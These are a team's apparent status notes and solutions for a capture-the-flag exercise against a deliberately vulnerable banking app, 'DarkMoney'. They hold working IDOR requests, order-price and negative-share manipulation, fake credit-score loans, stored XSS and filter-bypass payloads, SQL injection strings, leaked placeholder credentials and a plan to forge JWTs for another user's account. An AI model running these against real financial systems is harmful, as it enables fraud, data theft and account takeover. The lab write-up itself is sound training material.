# DarkMoney CTF — Status & Solutions

**Competition:** Schwab 2026 Advanced | **Team score:** 1910 | **Team rank:** improving  
**Progress:** 14 of 37 challenges solved  
**Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
**Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
**Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)

---

## ✅ SOLVED

| Challenge | Character | Points | Solution Summary |
|-----------|-----------|--------|-----------------|
| Whispers in the Source | Limbo | 50 | Sensitive data in page HTML source/comments |
| The Open Ledger | Limbo | 150 | IDOR on account/ledger data |
| Not Your Loan | Limbo | 50 | IDOR on `GET /api/users/{id}/loans` |
| Things You Were Asked Not to See | Limbo | 70 | robots.txt → `/secrets` → credentials + flag |
| Paper Trail | Limbo | 250 | IDOR on `GET /api/users/{id}/transactions/download` → user2 PDF |
| Locked, But Not Really | Limbo | 100 | Account lockout is cosmetic (`blocked:true` but not enforced) |
| Knock and Listen | Limbo | 50 | Differential 403 (exists) vs 404 (not found) on `GET /api/bill-pay/payments/{id}` |
| The Forgotten Rite | Trex | 120 | Sequential int IDOR on `GET /api/oracle/positions/{id}` (IDs 1–6 = other users) |
| A Tribute in Reverse | Trex | 100 | Negative shares on `POST /api/oracle/markets/{id}/orders` → money flows TO us |
| Name Your Price | Trex | 150 | Custom `entryPriceCents: 1` on oracle bet — pay 1¢ per share instead of market price |
| Borrowed Confidence | Trex | 320 | Business logic flaw — submit loan with fake creditScore: 850; server accepts without verification |
| Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
| By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
| The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |

**Total earned: 1910 pts**

---

## 🔄 IN PROGRESS (incomplete challenges)

### Honest Answers (Alpaca)
- **Vector:** SQL injection in transaction search field
- **Hint:** "Hand the transaction search something it can't assemble. I want the fault, not the answer: a broken one talks — it gives up what it meant to keep, and cannot help itself. Force that, then come back and check here."
- **Steps:**
  1. Find the transaction search endpoint (probably `GET /api/transactions?search=...`)
  2. Send SQLi payload to cause a DB error that leaks schema/data
  3. Error message reveals backend DB info = proof of injection
- **Payloads to try:** `'`, `' OR '1'='1`, `'; SELECT version(); --`
- **API:** `GET /api/transactions?search=' OR 1=1--`

### Frozen Assets (Alpaca)
- **Vector:** Bypass UI restriction to fund bill payment from frozen account
- **Hint:** "An option removed from the screen is not an option forbidden. Find the path the interface does not offer, and fund a bill payment from the account that was told to sit still."
- **Target account:** DMACC1005 (user 5's LOCKED account, balance $101,920)
- **Problem:** `POST /api/bill-pay/payments` with `fromAccountNumber: "DMACC1005"` returns 400 "Account DMACC1005 is not owned or linked by amorgan"
- **Options to try:**
  1. First link DMACC1005 to our account via `/api/linked-accounts`
  2. Find a hidden "admin" override or account transfer endpoint
  3. Use JWT signing key to forge a token as user 5 and make payment that way
  4. Try SSRF or parameter pollution to bypass ownership check

---

## 🔒 LOCKED / NOT YET UNLOCKED

Additional challenges are still locked (unlock by completing prerequisites):
- Trex: 3 locked challenges
- Alpaca: unclear count

---

## Solution Details

### Things You Were Asked Not to See — 70 pts — Flag: `ROBOTS_ARE_NOT_GUARDS`
1. `GET /robots.txt` → reveals `Disallow: /debug`, `/test`, `/secrets`
2. `GET /secrets` → HTML page with app credentials + flag

**Credentials leaked at /secrets:**
- `AWS_ACCESS_KEY_ID`: `AKIAFAKE1234567890`
- `AWS_SECRET_ACCESS_KEY`: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`
- `DB_PASSWORD`: `CorrectHorseBatteryStaple_final_final`
- `JWT_SIGNING_KEY`: `super-secret-signing-key-only-for-darkmoney-admins`
- `ENCRYPTION_SALT`: `NaCl_just_a_pinch`

### Paper Trail — 250 pts
1. `GET /api/users/2/transactions/download` returns 200 PDF (user 1–5 work, 6–8 → 400)
2. User 2 = **Priya Kapoor**, username **pkapoor**, accounts: DMACC1002/1007/1011/1013
3. Downloaded via: `fetch('/api/users/2/transactions/download', {credentials:'include'})`
4. Uploaded PDF to crwd-ctrl challenge form → 250 pts

### Locked, But Not Really — 100 pts
- Send 3+ wrong login attempts for `pkapoor`: `POST /api/auth/login` with wrong password
- After attempt 3: `{"success":false,"blocked":true}` appears
- Backend does NOT actually enforce the block
- Just triggering `blocked:true` state completed the challenge

### Knock and Listen — 50 pts
- `GET /api/bill-pay/payments/{id}` returns:
  - **403** `{"message":"Payment belongs to another account"}` → record exists, different user
  - **404** `{"message":"Payment not found"}` → record doesn't exist
- Our payment IDs: 1–52; ID 53+ = other users (all return 403)

### The Forgotten Rite — 120 pts
- `GET /api/oracle/positions` returns our bets: IDs 7, 8, 9, 10…
- `GET /api/oracle/positions/1` returns 200 → user 1's position (not ours!)
- IDs 1–6 all accessible = other users' oracle positions (sequential int IDOR)

### A Tribute in Reverse — 100 pts
- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":-100}`
- Server accepts negative shares → `costCents: -5800` → wallet INCREASES by $58
- Wallet went from $2500 → $2558

### Name Your Price — 150 pts
- `POST /api/oracle/markets/1005/orders` with `{"side":"YES","shares":100,"entryPriceCents":1}`
- Server accepts custom price → bought 100 shares at 1¢ each ($1) instead of 58¢ each ($58)
- Response: `{"entryPriceCents":1,"costCents":100,"walletBalance":"2557.00"}`

### Borrowed Confidence — 320 pts
- `POST /api/loans` with `{"loanType":"PERSONAL","loanAmount":25000,"creditScore":850}`
- Server accepts caller-supplied creditScore without verification → loan approved instantly
- crwd-ctrl auto-detected when the loan was approved

### Say It Again — 100 pts
- `POST /api/transactions` with `{"fromAccountNo":"DMACC1001","toAccountNo":"DMACC1006","amount":1,"remarks":"<script>alert(document.cookie)</script>"}`
- Then `GET /api/transactions/statement/print` renders remarks field unsanitized in HTML
- crwd-ctrl auto-detected on the statement print request

### By Any Other Name — 200 pts
- `POST /api/accounts` with `{"productId":"high-yield-savings","openingDeposit":100,"fundingType":"INTERNAL","fromAccountNo":"DMACC1001","displayName":"<script>alert(1)</script>"}`
- Server stores XSS payload in account displayName — form UI never allows custom names
- crwd-ctrl auto-detected when accounts page loaded

### The Prophecy That Speaks — 200 pts
- XSS guard "V1" blocks `<script>` tags but NOT other event handlers
- `POST /api/oracle/markets` with `description: "<img src=x onerror=alert(1)> — this is a test market..."`
- Fields required: `question`, `description` (min 12), `category` (POP/TECH/OFFICE/CIVIC), `closesAt`, `initialYesCents` (1-99), `depositCents` (2500-1000000)
- Navigate to the created market URL to trigger XSS — crwd-ctrl auto-detected

---

## Key API Endpoints

| Endpoint | Method | Notes |
|----------|--------|-------|
| `/robots.txt` | GET | Leaks hidden paths |
| `/secrets` | GET | Leaks all app credentials |
| `/api/users/self` | GET | Own user object |
| `/api/users/{id}/accounts` | GET | IDOR — users 1–9 |
| `/api/users/{id}/loans` | GET | IDOR — users 1–8 |
| `/api/users/{id}/transactions/download` | GET | IDOR PDF — users 1–5 |
| `/api/transactions/statement/print` | GET | HTML statement — XSS vector |
| `/api/transactions?page=0&size=10` | GET | Paginated tx list |
| `/api/bill-pay/payments?page=0&size=50` | GET | Own bill payments (IDs 1–52) |
| `/api/bill-pay/payments/{id}` | GET | 403=other user, 404=doesn't exist |
| `/api/bill-pay/payments` | POST | Create payment (requires owned account) |
| `/api/bill-pay/payees` | GET | List payees |
| `/api/oracle/positions` | GET | Own oracle bets |
| `/api/oracle/positions/{id}` | GET | IDOR — sequential int IDs (1–6 = other users) |
| `/api/oracle/markets/{id}/orders` | POST | Place bet — vulnerable to negative shares + custom price |
| `/api/oracle/wallet` | GET | Oracle wallet balance |
| `/api/oracle/wallet/deposit` | POST | Deposit to wallet |
| `/api/oracle/wallet/withdraw` | POST | Withdraw from wallet |
| `/api/oracle/markets` | GET | List oracle markets |
| `/api/oracle/markets/{id}` | GET | Market details |
| `/api/oracle/results` | GET | Resolved markets |
| `/api/auth/login` | POST | `{username,password}` → `{success,blocked}` |
| `/api/linked-accounts` | GET/POST | Linked external accounts |
| `/api/partner-banks` | GET | Lists 4 partner banks |
| `/api/manual-links/connector?connectorId=X` | GET | Bank connector info |

## Known Users
| UserID | Name | Username | Accounts | Notes |
|--------|------|----------|----------|-------|
| 1 | Alice Morgan | amorgan | DMACC1001, 1006, 1009 | Our account |
| 2 | Priya Kapoor | pkapoor | DMACC1002, 1007, 1011, 1013 | PDF user |
| 3 | ? | ? | DMACC1003, 1010 | |
| 4 | ? | ? | DMACC1004, 1008, 1012 | |
| 5 | ? | ? | DMACC1005 (LOCKED, $101,920) | Illumistrami account |
| 6 | ? | ? | DMACCLOAN001 | |
| 7 | ? | ? | DMACCRAIL001-003 | Rail/payment processors |
| 8 | ? | ? | DMACCORCL000 | Oracle account |
| 9 | ? | ? | DMACCEXT0001-0007 | External/shadow accounts |

## Partner Bank Codes
- `DM-ATL-0042` — Bank of Atlantis
- `DM-GRO-0117` — Groß Notional Bank
- `DM-TGK-0298` — Tallgrass Konza Bank
- `DM-FUE-0531` — Font & Underwood Exchange

## Tech Stack
- Frontend: React/Vite SPA
- Backend: nginx 1.31.6
- Auth: HttpOnly session cookie
- Axios for API calls (not fetch)
- SPA routes: `/transactions`, `/accounts`, `/transfer`, `/cards`, `/loans`, `/oracle`, `/bill-pay`
- JS bundle: `/assets/index-CY4Df-gA.js`

## Local LLM
```bash
curl http://localhost:11434/api/chat \
  -d '{"model":"qwen38-27b-unc-q4:latest","messages":[{"role":"user","content":"PROMPT"}],"stream":false,"think":true,"options":{"temperature":0.7,"num_ctx":32768},"keep_alive":-1}'
```
